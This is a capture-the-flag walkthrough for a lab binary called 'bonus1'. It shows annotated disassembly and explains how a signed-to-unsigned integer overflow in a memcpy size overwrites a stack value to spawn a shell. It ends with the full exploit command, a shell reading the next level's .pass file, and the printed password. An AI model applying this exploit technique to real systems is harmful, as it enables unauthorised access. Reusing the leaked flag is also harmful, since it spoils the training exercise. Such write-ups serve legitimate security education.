# bonus1

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     and    esp,0xfffffff0
   0x0804842a <+6>:     sub    esp,0x40
   0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc]              ; ⎤                                                 
   0x08048430 <+12>:    add    eax,0x4                              ; ⎦ add 4 to argv: get argv[1]                      
   0x08048433 <+15>:    mov    eax,DWORD PTR [eax]                  ; dereference argv[1]: get the string directly      
   0x08048435 <+17>:    mov    DWORD PTR [esp],eax                  ; prepare call to atoi with argv[1]                 
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>                 ; call atoi(argv[1])                                
   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax             ; move atoi result to esp+0x3c                      
   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9             ; compare argv[1] to 9                              
   0x08048446 <+34>:    jle    0x804844f <main+43>                  ; if argv[1] <= 9: jump to <main+43>              ⎤ 
   0x08048448 <+36>:    mov    eax,0x1                              ; return(1)                                       ⎥ 
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>                 ; jump to the end <main+127>                      ⎥ 
   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]             ; get argv[1] argument (stored at <main+25>)      ⎦ 
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]                      ; ecx is initialize                                 
   0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]              ; ⎤                                                
   0x0804845d <+57>:    add    eax,0x8                              ; ⎦ get argv[2]                                     
   0x08048460 <+60>:    mov    eax,DWORD PTR [eax]                  ; ⎤                                                 
   0x08048462 <+62>:    mov    edx,eax                              ; ⎥                                                 
   0x08048464 <+64>:    lea    eax,[esp+0x14]                       ; ⎥                                                 
   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx              ; ⎥                                                 
   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx              ; ⎥                                                 
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax                  ; ⎥                                                 
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>               ; ⎦ call memcpy(buf, argv[2], ecx)                  
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46      ; compare argv[1] address to 0x574f4c46             
   0x08048480 <+92>:    jne    0x804849e <main+122>                 ; if not equal: jump to <main+122>                ⎤ 
   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0              ;                                                 ⎥ 
   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580        ;                                                 ⎥ 
   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583            ;                                                 ⎥ 
   0x08048499 <+117>:   call   0x8048350 <execl@plt>                ; execl("bin/sh")                                 ⎥ 
   0x0804849e <+122>:   mov    eax,0x0                              ; return(0)                                       ⎦ 
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```

## Exploit

`bonus1` take _two_ arguments:

- The first is an _signed_ `int` because of `atoi`.
- The second is a string which is copied by `memcpy` to a buffer on the stack.

We are going to exploit the fact that `memcpy` use `size_t` (an unsigned integer) and the first argument is a signed
integer: it is an _integer overflow_.

We need to find a `int` that is less than 9 (`<main+34>`). Then, this `int` is used for `memcpy` size but it is
multiplied by 4 before it uses it. Finally the same `int` returned by `atoi` is compared to `0x574f4c46`, which is a big
positive value... It seems to be difficult to find a value that is less than 9 and equal to 1464814662 (`0x574f4c46`).

That is without counting on integer overflow. This integer overflow will lead us to a buffer overflow by `memcpy`
because the `int` value returned by `atoi` is stored next to the buffer. So we are going to crush its value.

In `Resources`, we have a small C program to visualize an number as signed, unsigned and hexadecimal values.

Let's find how big is the buffer for `memcpy`:

```gdb
   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
```

Here, `atoi` return is stored at `esp+0x3c`.

```gdb
   0x08048464 <+64>:    lea    eax,[esp+0x14]
```

Before `memcpy` call, we notice that the buffer begins at `esp+0x3c`. Thus the total size of the buffer seems to be
`0x3c - 0x14` that is to say `40`. Consequently, the `int` value we are targetting is at 41th, 42th, 43th and 44th
bytes. So we know that the second argument is going to be something like `python -c 'print "A" * 40 +
"\x46\x4c\x4f\x57"`.

Let's find the integer trick for the first argument. We take the minimal signed integer and add 11 (because the buffer
is 4 times 11). Let's simulate how it is going to work inside the function:

```python
>>> -2**31 + 11         ; Take the INT_MIN and add (buffer_size / 4)                                                    
-2147483637                                                                                                             
>>> hex(2147483659 * 4) ; This value in hexadecimal is multiplied by 4                                                  
'0x20000002c'           ; It gives us 0x20000002c which corresponds to 0x0000002c in unsigned int                       
>>> 0x2c                                                                                                                
44                      ; Which is equal to 44                                                                          
```

Thus the `size_t` value in `memcpy` is going to be `0x2c` (`44`). It overrides previous the first argument on the stack
by `0x574f4c46`. Win!

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
